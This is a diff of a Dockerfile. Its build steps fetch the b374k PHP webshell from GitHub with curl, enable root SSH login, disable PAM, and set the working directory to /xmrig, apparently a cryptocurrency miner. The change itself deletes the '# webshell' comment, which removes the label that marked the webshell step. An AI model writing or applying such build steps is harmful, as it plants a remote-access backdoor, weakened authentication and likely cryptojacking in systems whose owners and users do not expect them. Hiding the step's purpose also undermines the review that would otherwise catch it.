@@ -48,7 +48,6 @@ RUN mv /etc/supervisor/supervisord.conf /etc/supervisor/supervisord.conf.default
  cp -rf /root/template/conf/nginx/* /etc/nginx/ ; \
  cp /root/template/conf/php-fpm.conf /etc/php/5.6/fpm/php-fpm.conf
 
-# webshell
 RUN \
  mkdir -p /root/thirdparty ; \
  curl -sSL https://github.com/pikeman20/b374k/archive/v3.2.3.tar.gz | tar -zxf - -C /root/thirdparty/ ; \
@@ -62,6 +61,7 @@ RUN sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
 RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config
 
 EXPOSE 80
+
 WORKDIR    /xmrig
 ENTRYPOINT  ["/bin/bash","/root/sbin/init.sh"]
 #CMD    ["/usr/sbin/sshd", "-D"]
